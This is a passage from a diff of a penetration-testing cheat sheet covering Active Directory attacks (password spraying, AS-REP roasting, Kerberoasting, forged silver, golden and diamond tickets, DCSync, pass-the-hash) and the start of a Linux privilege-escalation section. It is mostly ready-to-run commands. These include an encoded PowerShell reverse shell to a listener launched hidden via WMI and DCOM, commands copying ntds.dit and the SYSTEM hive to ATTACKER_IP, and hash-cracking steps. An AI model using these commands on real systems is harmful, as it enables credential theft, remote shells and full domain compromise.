+	- NOTE: the KDC does NOT check that the user is allowed access to the service. This function is performed by the SPN itself. This opens the door for a Kerberoasting attack.
+3. Assuming checks pass, KDC sends client _Ticket Granting Server Reply (TGS-REP)_, containing name of service with access granted, session key for use between client and service, and a _service ticket_ containing the username and group memberships along with the newly-created session key.
+	- The service name and service-session key are encrypted with the TGT-session key for client to use.
+	- The service ticket is encrypted using the password hash of the SPN registered for the service in question.
+
+Finally, the client can request access to the service from the application server:
+1. Client sends server _Application Request (AP-REQ)_, which includes service ticket and the encrypted username and timestamp (encrypted with the service-session key)
+2. Application server performs several actions/checks to verify the AP-REQ:
+	1. Decrypts the service ticket using its service account password hash
+	2. Extracts username and session key from service ticket
+	3. Uses session key to decrypt username and timestamp
+	4. Checks valid timestamp
+	5. Checks username of service ticket matches decrypted one from AP-REQ
+3. Assuming checks pass, the client is granted access to the service
+
+**NTLM** (NTLMv2) authentication is a challenge-and-response system. NTLM is a fast hashing algorithm for authentication, so it can easily be cracked. These are the steps for NTLM authentication:
+1. Client calculates the cryptographic NTLM hash from the user's password
+2. Client sends username to (application) server
+3. Server sends nonce to client
+4. Client encrypts nonce with NTLM hash and sends result to server
+5. Server forwards encrypted nonce, nonce and username to DC
+6. DC encrypts nonce with stored NTLM hash of user and checks against supplied encrypted nonce
+7. If two encrypted nonces match, DC sends authentication verified message to server
+
+NTLM authentication is used in 3 cases in Active Directory:
+- when a client authenticates to a server by IP address (instead of by hostname)
+- if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server
+- third-party applications may choose to use NTLM authentication instead of Kerberos
+
+In modern versions of Windows, the NTLM hashes/Kerberos tokens are cached in the Local Security Authority Subsystem Service (LSASS) memory space, so we can steal them using Mimikatz. To steal tickets, **make sure you interact with the target service first** (e.g. list directory of share)!
+
+Microsoft provides the AD role _Active Directory Certificate Services (AD CS)_ to implement a PKI, which exchanges digital certificates between authenticated users and trusted resources. If a server is installed as a _Certification Authority (CA)_ it can issue and revoke digital certificates (and much more). This can be abused to defeat active directory authentication that relies on PKI, including Smart Cards.
+
+
+### 6.2.1 Change Active Directory Credentials
+
+If you have `GenericAll` (or `Self`) permissions over any user in Active Directory, you can change that user's password. This is one way to privesc or move laterally in an Active Directory domain.
+
+To change the password of a user on a Windows AD domain:
+
+```powershell
+# simple way
+net user /domain USERNAME PASSWORD
+
+# powershell way
+Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "qwert@12345" -Force)
+```
+
+
+
+### 6.2.2 Password Spraying in Active Directory
+
+```powershell
+# check account policy's password lockout threshold
+net accounts
+```
+
+See the simple [`Spray-Passwords.ps1`](tools/win/Spray-Passwords.ps1) script, which is based on an expansion of this idea:
+
+```powershell
+$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
+$dn=([adsi]'').distinguishedName
+$p=("LDAP://"+$pdc.Name+"/"+$dn);
+$d=New-Object System.DirectoryServices.DirectoryEntry($p,"USERNAME","PASSWORD")
+```
+
+Use the script like so:
+
+```powershell
+.\Spray-Passwords.ps1 -Admin -Pass "PASSWORD"
+```
+
+Alternatively, use **CrackMapExec**, which has bonus of showing whether user is Admin on target by adding `Pwn3d!` to output. NOTE: CME does not throttle requests, so watch out for account lockout.
+
+```sh
+# check list of usernames against single host
+crackmapexec smb -u users.txt -p 'PASSWORD' --continue-on-success -d DOMAIN VICTIM_IP
+
+# (assuming you know password) check which machines user(s) can access and has admin on.
+# For admin, look for '(Pwn3d!)'
+crackmapexec smb -u USERNAME -p 'PASSWORD' --continue-on-success -d DOMAIN CIDR_OR_RANGE
+```
+
+Another option is **Kerbrute**:
+
+```sh
+# fetch kerbrute
+wget -O kerbrute32.exe https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_386.exe
+wget -O kerbrute64.ese https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe
+wget -O kerbrute https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
+chmod +x kerbrute
+
+# on linux
+./kerbrute passwordspray -d DOMAIN ./usernames.txt 'PASSWORD' --dc DOMAIN_IP
+
+# on windows
+.\kerbrute64.exe passwordspray -d DOMAIN .\usernames.txt "PASSWORD"
+# if you receive a network error, make sure that the encoding of usernames.txt is ANSI.
+# You can use Notepad's Save As functionality to change the encoding.
+```
+
+
+### 6.2.3 AS-REP Roasting
+
+AS-REP Roasting is an attack to retrieve a user's password hash that can be brute-forced offline.
+
+Normally when requesting a TGT, a client must prove its identity by encrypting the timestamp with it's hashed password in the AS-REQ. This is known as *Kerberos Preauthentication*. However, some services require turning preauthentication off (by enabling the _Do not require Kerberos preauthentication (i.e. DONT_REQ_PREAUTH)_ option) in order to function. This means that they (or any attacker) can request a TGT without submitting an encrypted timestamp, and the server will respond with a properly-encrypted TGT. Because the session key contains an HMAC encrypted with the user's hash, we can brute force this offline. Under the hood, the attack also weakens the crypto by requesting RC4 as the only allowable cipher for the HMAC (vs. the default of AES256-CTS).
+
+Enumerating for users that are AS-REP Roastable:
+
+```powershell
+# Windows: using PowerView
+Get-DomainUser -PreauthNotRequired | select samaccountname
+
+# Microsoft standard way of looking for users with 
+# "Do not require Kerberos Preauthentication" option set (hex 0x400000 = 4194304)
+# requires ActiveDirectory module to be loaded
+Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | fl
+
+# Kali: using impacket (specify user info for authentication to DC)
+impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
+```
+
+Collecting hashes using AS-REP Roast attack:
+
+```powershell
+# Windows: use Rubeus.exe (can use /format:hashcat interchangably)
+.\Rubeus.exe asreproast /format:john /outfile:asreproast.hash
+# push to stdout instead of file
+.\Rubeus.exe asreproast /nowrap
+
+# Kali: use impacket (specify user info for authentication to DC)
+impacket-GetNPUsers -request -outputfile asreproast.hash -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
+```
+
+Cracking the AS-REP roast hashes:
+
+```sh
+# using John-the-Ripper (auto-detects krb5asrep format)
+john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.hash
+
+# using hashcat
+hashcat -m 18200 --force -r /usr/share/hashcat/rules/best64.rule asreproast.hash /usr/share/wordlists/rockyou.txt
+```
+
+If you have write permissions for another user account (e.g. `GenericAll`), then, instead of changing their password, you could momentarily set their account to disable Preauth, allowing you to AS-REP roast their account. Here's how:
+
+```powershell
+# using Microsoft ActiveDirectory Module
+get-aduser -identity $USERNAME | Set-ADAccountControl -doesnotrequirepreauth $true
+
+# using AD Provider
+$flag = (Get-ItemProperty -Path "AD:\$DISTINGUISHED_NAME" -Name useraccountcontrol).useraccountcontrol -bor 0x400000
+Set-ItemProperty -Path "AD:\$DISTINGUISHED_NAME" -Name useraccountcontrol -Value "$flag" -Confirm:$false
+
+# using ADSI accelerator (legacy, may not work for cloud-based servers)
+$user = [adsi]"LDAP://$DISTINGUISHED_NAME"
+$flag = $user.userAccountControl.value -bor 0x400000
+$user.userAccountControl = $flag
+$user.SetInfo()
+```
+
+
+### 6.2.4 Kerberoasting
+
+Kerberoasting is an attack to retrieve the password hash of a Service Principal Name (SPN) that can be brute-forced offline.
+
+When requesting the service ticket from the KDC, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN. These checks are performed only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. The service ticket's HMAC is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt the HMAC using brute force or guessing, we can use this information to crack the cleartext password of the service account. This is known as Kerberoasting. It is very similar to AS-REP Roasting, except it is attacking SPNs' hashes instead of users'.
+
+Obtaining the SPN Hashes:
+
+```powershell
+# Windows: use Rubeus
+# '/tgtdeleg' tries to downgrade encryption to RC4
+.\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.hash
+
+# Kali: use impacket
+impacket-GetUserSPNs -request -outputfile kerberoast.hash -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
+```
+
+Cracking the kerberoast hashes:
+
+```sh
+# using John-the-Ripper (auto-detects krb5tgs format)
+john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hash
+
+# using hashcat
+hashcat -m 13100 --force -r /usr/share/hashcat/rules/best64.rule kerberoast.hash /usr/share/wordlists/rockyou.txt
+```
+
+If the SPN runs in the context of a computer account, a managed service account, or a group-managed service account, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the `krbtgt` user account which acts as service account for the KDC.
+
+If you have write permissions for another user account (e.g. `GenericAll`), then, instead of changing their password, you could momentarily add/register an SPN to their account, allowing you to kerberoast them.
+
+
+### 6.2.5 Silver Ticket
+
+A Silver Ticket is a forged service ticket that an attacker uses to gain access to a service.
+
+Privileged Account Certificate (PAC) validation is an optional verification process between the SPN application and the DC. If this is enabled, the user authenticating to the service and its privileges are validated by the DC. Fortunately for this attack technique, service applications rarely perform PAC validation.
+
+That means that an attacker with the SPN password (or its NTLM hash) can forge a service ticket for any user with whatever group memberships and permissions the attacker desires, and the SPN will commonly blindly trust those permissions rather than verify them with the DC.
+
+We need to collect the following three pieces of information to create a silver ticket:
+
+- SPN password hash (can get with mimikatz when SPN has session on your computer)
+- Domain SID (extract from user SID)
+- Target SPN
+
+More info: [HackTricks - Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)
+
+Getting prerequisite info:
+
+```powershell
+# use mimikatz to get SPN NTLM hash
+mimikatz.exe
+> privilege::debug
+> sekurlsa::logonpasswords
+
+# extract the Domain SID from the user SID (everything but RID, numbers after last dash)
+whoami /user
+
+# list SPNs from specific host
+setspn -l HOSTNAME
+# example for IIS server: HTTP/web04.corp.com:80
+```
+
+Create silver ticket in mimikatz:
+
+```powershell
+# you can use any valid username
+# /ptt - pass the ticket; auto-injects it into memory
+kerberos::golden /sid:S-1-5-... /domain:DOMAIN /ptt /target:SERVER_FQDN /service:http /rc4:NTLM_HASH /user:ADMIN_USER
+
+# TODO: figure out how to do this with Rubeus.exe
+# Rubeus lets you ask for tickets for all services at once:
+# /altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm
+.\Rubeus.exe silver /rc4:NTHASH /user:USERNAME /service:SPN /ldap /ptt [/altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm] [/nofullpacsig] [outfile:FILENAME]
+
+# Kali: use impacket
+# Service is something like http, cifs, host, ldap, etc. (cifs lets you access files)
+impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN -spn SERVICE/VICTIM_FQDN USERNAME
+export KRB5CCNAME=$(pwd)/USERNAME.ccache 
+impacket-psexec DOMAIN/USERNAME@VICTIM -k -no-pass
+```
+
+Confirm ticket is loaded in memory on Windows host:
+
+```powershell
+# list kerberos tickets available to user
+klist
+
+# make web request with silver ticket
+iwr -UseDefaultCredentials http://VICTIM
+```
+
+Before 11 October 2022, it was possible to forge Silver tickets for nonexistent users. That's no longer the case, due to a security patch that adds the `PAC_REQUESTOR` field to the Privilege Attribute Certificate (PAC) structure. The field contains the username, and it is required to be validated by the DC (when patch is enforced).
+
+### 6.2.6 Domain Controller Synchronization (DCSync)
+
+DCSync lets you remotely dump the hashes from a domain controller's `ntds.dit` file.
+
+When multiple DCs are in use for redundancy, AD uses the Directory Replication Service (DRS) Remote Protocol to replicate (synchronize) these redundant DCs (e.g. using `IDL_DRSGetNCChanges` API). The DC receiving the sync request does not check that the request came from a known DC, only that the SID making the request has appropriate privileges.
+
+To launch such a replication, a user needs to have the *Replicating Directory Changes*, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set* rights. By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned. If we get access to any user account with these rights, we can impersonate a DC and perform the DCsync attack. The end result is the target DC will send the attacker copies of any data he requests.
+
+Performing dcsync attack:
+
+```powershell
+# From inside mimikatz shell
+# grab all hashes from DC
+lsadump::dcsync
+# grab hashes of specific user
+lsadump::dcsync /user:corp\Administrator
+
+# Kali: use impacket
+# full dump of hashes
+# you can use '-hashes LMHASH:NTHASH' for auth instead of password (or omit LMHASH)
+impacket-secretsdump -just-dc -outputfile dcsync DOMAIN/ADMINUSER:PASSWORD@DC_IP
+# grab specific user's hashes
+impacket-secretsdump -just-dc-user -outputfile dcsync USER DOMAIN/ADMINUSER:PASSWORD@DC_IP
+```
+
+Crack dumped NTLM hashes:
+
+```sh
+❯ hashcat -m 1000 -w3 --force -r /usr/share/hashcat/rules/best64.rule --user dcsync.ntds /usr/share/wordlists/rockyou.txt
+```
+
+
+## 6.3 Lateral Movement in Active Directory
+
+Pass-the-Hash (PtH) only works for servers using NTLM authentication (not Kerberos only). Authentication is performed using an SMB connection, so port 445 must be open, the Windows File and Printer Sharing feature to be enabled (it is by default), and the `ADMIN$` share to be available. It also requires local administrator rights. Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example, cmd.exe or an instance of PowerShell) and communicate with it using Named Pipes. This is done using the Service Control Manager API.
+
+
+
+### 6.3.1 PsExec on Active Directory
+
+PsExec allows you to run remote processes as a child of a Windows service process, meaning you get SYSTEM privileges.
+
+Prerequisites: The user that authenticates to the target machine needs to be part of the *Administrators* local group. In addition, the _ADMIN$_ share must be available and File and Printer Sharing must be turned on (this is default).
+
+PsExec is part of the Sysinternals suite, and performs the following tasks:
+- Writes `psexesvc.exe` into the `C:\Windows` directory
+- Creates and spawns a service on the remote host
+- Runs the requested program/command as a child process of `psexesvc.exe`
+
+Using Sysinternals PsExec for remote interactive session (from windows host):
+
+```powershell
+# interactive shell using sysinternals version of psexec
+./PsExec64.exe -accepteula -i  \\VICTIM -u DOMAIN\ADMINUSER -p PASSWORD cmd
+```
+
+Using `impacket-psexec` from Kali, pass-the-hash is possible:
+
+```sh
+# spawns interactive shell as SYSTEM
+impacket-psexec -hashes :NTHASH ADMINUSER@VICTIM_IP
+
+# with password authentication:
+impacket-psexec 'ADMINUSER:PASSWORD@VICTIM_IP'
+```
+
+
+### 6.3.2 WMI and WinRM on Active Directory
+
+WMI and WinRM both require plaintext credentials when executed from Windows (hashes are sufficient from Linux with impacket), and they both allow running commands as an administrator on a remote machine.
+
+*Windows Management Instrumentation (WMI)* is capable of creating processes via the `Create` method from the `Win32_Process` class. It communicates through *Remote Procedure Calls (RPC)* over port 135 for remote access. In order to create a process on the remote target via WMI, we need (plaintext credentials of a member of the *Administrators* local group. The nice thing about WMI for lateral movement is that UAC remote access restrictions don't apply for domain users on domain-joined machines, so we can leverage full privileges.
+
+Abusing WMI for lateral movement (from Windows):
+
+```powershell
+# create remote process with legacy tool: wmic
+wmic /node:VICTIM_IP /user:LOCALADMIN /password:PASSWORD process call create "calc.exe"
+
+# create remote process with PowerShell's WMI
+# variable declaration
+$username = 'LOCALADMIN';
+$password = 'PASSWORD';
+$victim = 'VICTIM'
+$lhost = 'LISTEN_IP'
+$lport = 443
+$revshell = '$client=New-Object System.Net.Sockets.TCPClient("'+$lhost+'",'+$lport+');$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String );$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
+$b64cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($revshell));
+$command = 'powershell -ep bypass -nop -w hidden -enc '+$b64cmd;
+# requires PSCredential object to hold creds
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+# then create Common Information Model (CIM) session object with DCOM protocol
+# (i.e. WMI session)
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-CimSession -ComputerName $victim -Credential $credential -SessionOption $options
+# Invoke Create method of Win32_Process
+Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};
+```
+
+Using WMI from Kali, which allows pass-the-hash!
+
+```sh
+# spawns remote shell as admin user with pass-the-hash
+impacket-wmiexec -hashes :NTHASH ADMINUSER@VICTIM_IP
+
+# using password authentication
+impacket-wmiexec 'ADMINUSER:PASSWORD@VICTIM_IP'
+```
+
+*Windows Remote Management (WinRM)* is an alternative to WMI for remote administration, which we can also abuse. The benefit is that we get the output of commands we run on the attacker's Windows machine, and we can even get an interactive PowerShell session directly through WinRM.
+
+WinRM is the Microsoft version of the WS-Management protocol, and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP. For WinRM to work, you need plaintext credentials of a domain user who is a member of the Administrators or Remote Management Users group on the target host.
+
+Abusing WinRM for lateral movement (from Windows host):
+
+```powershell
+# legacy Windows Remote Shell (winrs) tool:
+winrs -r:VICTIM -u:ADMINUSER -p:PASSWORD  "cmd /c hostname & whoami"
+# stdout of cmd is printed here!
+
+# using PowerShell
+# variable declaration
+$username = 'LOCALADMIN';
+$password = 'PASSWORD';
+# starts same as WMI, creating PSCredential object
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+# create WinRM sesson
+New-PSSession -ComputerName $victim -Credential $credential
+# interactive session
+Enter-PSSession 1
+```
+
+Abusing WinRM from Kali (allows pass the hash):
+
+```sh
+# interactive shell as admin user using PtH
+evil-winrm -i VICTIM_IP -u ADMINUSER -H NTHASH
+
+# or with password auth
+evil-winrm -i VICTIM_IP -u ADMINUSER -p PASSWORD
+```
+
+
+### 6.3.3 Overpass-the-Hash
+
+Overpass-the-hash is when you use an NTLM (or AES256) hash to obtain a Kerberos TGT in an environment where NTLM authentication is not allowed. Once you have the impersonated-user's TGT, you can use all the Windows tools/services that rely on Kerberos in the context of that user (e.g. PsExec)
+
+**NOTE**: Because Kerberos relies on domain names, you must use those for any commands instead of IP addresses.
+
+```powershell
+# using mimikatz
+privilege::debug
+# grab hash:
+sekurlsa::logonpasswords
+# perform overpass-the-hash, starting powershell window as user
+# alternatively, kick off reverse shell
+sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:powershell
+# in new powershell session, interact to get/cache TGT (and TGS):
+net use \\VICTIM
+# inspect that you have TGT now
+klist
+# ready to use this session with creds (see psexec cmd below)
+
+
+# using Rubeus
+# be sure to use format "corp.com" for DOMAIN
+.\Rubeus.exe asktgt /domain:DOMAIN /user:USER /rc4:NTHASH /ptt
+
+
+# now you can use PsExec in context of stolen user
+.\PsExec.exe -accepteula \\VICTIM cmd
+# note, the spawned shell will be under stolen user, not SYSTEM
+
+# or maybe just list shares
+net view \\VICTIM
+dir \\VICTIM\SHARE
+```
+
+On Kali, use impacket:
+
+```sh
+# be sure to use format "corp.com" for DOMAIN
+impacket-getTGT -dc-ip DC_IP DOMAIN/USERNAME -hashes :NTHASH # or -aesKey AESKEY
+export KRB5CCNAME=$(pwd)/USERNAME.ccache
+impacket-psexec -k -no-pass DOMAIN/USER@VICTIM_FQDN
+# this spawned shell will (still) be SYSTEM
+# when you can't resolve domain IPs, add -dc-ip DC_IP -target-ip VICTIM_IP
+
+# if you get the error:
+[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)
+# check that the target IP is correct/matches the victim hostname
+
+# USE THIS
+# you can also do overpass-the-hash directly with one command:
+impacket-psexec -k -hashes :NTLM VICTIM_FQDN
+```
+
+
+### 6.3.4 Pass-the-Ticket
+
+In Pass-the-Ticket, you steal someone else's kerberos ticket from memory and use it to access resources you wouldn't be able to. Stealing a TGS ticket more versatile than a TGT because you can use it on other machines, not just the one you stole it from. This attack is similar to Overpass-the-hash, except you're skipping over the AS-REQ, straight to the part where you have a ticket in hand.
+
+Acquiring tickets with mimikatz:
+
+```powershell
+# in mimikatz shell:
+privilege::debug
+sekurlsa::tickets /export
+kerberos::ptt FILENAME.kirbi
+
+# in cmd shell:
+# list tickets (pick which ones you want to copy to other machine)
+dir *.kirbi
+
+# check you have the ticket in memory
+klist
+
+# then use the permissions granted by the ticket (e.g. list files in share)
+ls \\VICTIM\SHARE
+```
+
+Acquiring tickets with Rubeus:
+
+```powershell
+# from elevated cmd prompt
+# list all tickets in memory
+.\Rubeus.exe triage
+
+# dump desired tickets (base64 encoded .kirbi printed to stdout)
+.\Rubeus.exe dump /nowrap [/luid:LOGINID] [/user:USER] [/service:krbtgt]
+
+# load the ticket into session (copy and paste base64 kirbi data from previous)
+.\Rubeus.exe ptt /ticket:BASE64_KIRBI
+```
+
+Using saved tickets from Kali:
+
+```sh
+# if you have base64 ticket from Rubeus, convert to .kirbi first
+echo -n "BASE64_KIRBI" | base64 -d > USERNAME.kirbi
+
+# convert .kirbi to .ccache
+impacket-ticketConverter USERNAME.kirbi USERNAME.ccache
+
+# export path to .ccache to use with other tools
+export KRB5CCNAME=$(pwd)/USERNAME.ccache
+
+# use with crackmapexec, impacket-psexec/wmiexec/smbexec
+# make sure you set /etc/hosts to reslove FQDN for crackmapexec
+crackmapexec smb --use-kcache VICTIM_FQDN
+impacket-psexec -k -no-pass VICTIM_FQDN
+```
+
+
+### 6.3.5 DCOM
+
+Detailed first writeup by [cybereason](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
+
+Microsoft's *Component Object Model (COM)* allows software interaction between processes, and _Distributed Component Object Model (DCOM)_ extends COM to allow process interaction on remote hosts.
+
+Both COM and DCOM are very old technologies dating back to the very first editions of Windows. Interaction with DCOM is performed over RPC on TCP port 135 and local **administrator access is required** to call the DCOM Service Control Manager, which is essentially an API.
+
+The following DCOM lateral movement technique is based on the *Microsoft Management Console (MMC)* COM application that is employed for scripted automation of Windows systems. The MMC Application Class allows the creation of Application Objects, which expose the `ExecuteShellCommand` method under the `Document.ActiveView` property. This method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.
+
+Leveraging DCOM to get a reverse shell on a remote machine:
+
+```powershell
+# variable declaration
+$victim = 'VICTIM' # hostname or IP
+$lhost = 'LISTEN_IP'
+$lport = 443
+$revshell = '$client=New-Object System.Net.Sockets.TCPClient("'+$lhost+'",'+$lport+');$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String );$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
+$b64cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($revshell));
+$command = 'powershell -ep bypass -nop -w hidden -enc '+$b64cmd;
+# create the DCOM MMC object for the remote machine
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1",$victim))
+# execute shell command through DCOM object
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,$command,"7")
+# ExecuteShellCommand accepts 4 parameters:
+# Command, Directory, Parameters, and WindowState (7 is hidden).
+```
+
+
+## 6.4 Active Directory Persistence
+
+### 6.4.1 Golden Ticket
+
+A Golden Ticket is a forged TGT that grants the user full Domain Admin rights across the entire domain. It requires having access to the `krbtgt` account's password hash, which means we've either compromised a Domain Admin account or the Domain Controller machine directly. The `krbtgt` account's hash is what the KDC uses for signing (encrypting) TGTs in the AS-REP. It's special because it's never changed automatically.
+
+Taking advantage of a Golden Ticket is a form of overpass-the-hash, using the `krbtgt` hash to forge a TGT directly instead of submitting an AS-REQ with a regular user's hash to get the DC to grant you a TGT.
+
+Before starting, make sure you have the `krbtgt` hash. You can get this many ways, including running `lsadump::lsa` in mimikatz on the DC, performing a dcsync attack, etc. Additionally, you must use an existing username (as of July 2022), and not a phony one.
+
+```powershell
+# extract the Domain SID from the user's SID
+# (remove the RID and keep the rest. RID is last set of numbers in SID)
+whoami /user
+
+# in mimikatz shell
+privilege::debug
+# remove all existing tickets, so they don't conflict with the one you're forging
+kerberos::purge
+# forge golden ticket, load into memory with /ptt
+# note use of '/krbtgt:' to pass NTHASH instead of '/rc4:' - difference b/w silver
+# use '/aes256:' for AES256 kerberos hash
+kerberos::golden /user:USER /domain:DOMAIN /sid:S-1-5-21-.... /krbtgt:NTHASH /ptt
+# start cmd shell with new ticket in its context
+misc::cmd cmd
+
+# alternatively, use Rubeus (/aes256: if desired)
+.\Rubeus.exe golden /ptt /rc4:HASH /user:USERNAME /ldap [outfile:FILENAME]
+# here's loading a saved ticket:
+.\Rubeus.exe ptt /ticket:ticket.kirbi
+
+# list tickets in memory, make sure its there
+klist
+
+# now use overpass-the-hash technique (full domain name required)
+.\PsExec.exe \\dc1 cmd.exe
+```
+
+You can forge a Golden Ticket on Kali:
+
+```sh
+# look up domain SID
+impacket-lookupsid DOMAIN/USER:PASSWORD@VICTIM
+
+# use -aesKey for AES256 hashes
+impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN USERNAME
+export KRB5CCNAME=$(pwd)/USERNAME.ccache
+impacket-psexec -k -no-pass DOMAIN/USERNAME@VICTIM
+# be sure to use FQDNs. Pass -dc-ip and -target-ip if necessary to resolve FQDNs
+```
+
+Even better (more OPSEC savvy) is a *Diamond Ticket*, where you modify the fields of a legitimate TGT by decrypting it with the `krbtgt` hash, modify it as needed (e.g. add Domain Admin group membership) and re-encrypt it.
+
+```powershell
+# Get user RID
+whoami /user
+
+.\Rubeus.exe diamond /ptt /tgtdeleg /ticketuser:USERNAME /ticketuserid:USER_RID /groups:512 /krbkey:AES256_HASH
+# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
+# /ticketuser is the username of the principal to impersonate.
+# /ticketuserid is the domain RID of that principal.
+# /groups are the desired group RIDs (512 being Domain Admins).
+# /krbkey is the krbtgt AES256 hash. 
+```
+
+
+### 6.4.2 Volume Shadow Copy
+
+Domain Admins can abuse shadow copies to obtain a copy of the `ntds.dit` file (the Active Directory database, containing all user credentials).
+
+A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes. Shadow copies are managed by the binary `vshadow.exe`, part of the Windows SDK. They can also be created using WMI.
+
+```powershell
+# from elevated terminal session:
+
+# create volume shadow copy of C: drive
+# -nw : no writers (to speed up creation)
+# -p : store copy on disk
+vshadow.exe -nw -p  C:
+# pay attention to Shadow copy device name
+# line uner * SNAPSHOT ID = {UUID}
+#    - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+
+# create SMB session with hacker machine
+net use \\ATTACKER_IP herpderp /user:derp
+
+# copy the ntds.dit file over to attacker machine (must do in cmd, not PS)
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit \\ATTACKER_IP\share\ntds.dit.bak
+
+# save copy of SYSTEM registry hive onto attacker machine
+# this contains the encryption keys for the ntds.dit file
+reg.exe save hklm\system \\ATTACKER_IP\share\system.hiv
+
+# on Kali, use secretsdump to extract hashes
+impacket-secretsdump -ntds ntds.dit.bak -system system.hiv -outputfile ntds-dump LOCAL
+```
+
+Alternative ways to create shadow copies, plus ways of working with them:
+
+```powershell
+# create shadow copy with wmic:
+wmic shadowcopy call create volume=c:\
+
+# create with PowerShell
+([WMICLASS]"root\cimv2:win32_shadowcopy").create("C:\","ClientAccessible")
+
+# list all volume shadow copies for C: drive
+vssadmin list shadows /for=C:
+
+# list using Powershell (shows date created)
+Get-CimInstance Win32_ShadowCopy | select Name,Caption,Description,ServiceMachine,InstallDate,ID,DeviceObject
+
+# if you want to browse the files in the shadow copy, mount it:
+# Note the trailing slash at the end of the shadow copy device name's path!
+mklink /D C:\users\Public\stuff SHADOWCOPYDEVNAME\
+```
+
+`Secretsdump` also supports the VSS method directly:
+
+```sh
+# perform VSS technique all in one go using secretsdump (-use-vss flag)
+impacket-secretsdump -use-vss -just-dc -outputfile ntds-dump DOMAIN/ADMINUSER:PASSWORD@DC_IP
+```
+
+
+
+
+# 7 Linux
+
+## 7.1 Basic Linux Post-Exploit Enumeration
 
 Before you run basic enumeration, [upgrade to an interactive shell](#4.4.3%20Upgrading%20to%20Interactive%20Shell)
 
@@ -5005,7 +6331,7 @@ cat /etc/motd
 getenforce
 ```
 
-### 6.1.1 Watching for Linux Process Changes
+### 7.1.1 Watching for Linux Process Changes
 
 ```sh
 #!/bin/bash
@@ -5027,14 +6353,14 @@ done
 Also check out [pspy](https://github.com/DominicBreuker/pspy)
 
 
-## 6.2 Linux Privilege Escalation
+## 7.2 Linux Privilege Escalation
 
 So many options:
 - [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 - [HackTricks - Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
 
 
-### 6.2.1 Abusing `sudo`
+### 7.2.1 Abusing `sudo`
 
 [Many binaries](https://gtfobins.github.io/#+sudo) let you run commands from within them. If you get limited `sudo`
 permissions for one of the binaries, you can escalate to root.
@@ -5055,7 +6381,7 @@ sudo awk 'BEGIN {system("/bin/sh")}'
 sudo find . -exec /bin/sh \; -quit
 ```
 
-### 6.2.2 Adding root user to /etc/shadow or /etc/passwd
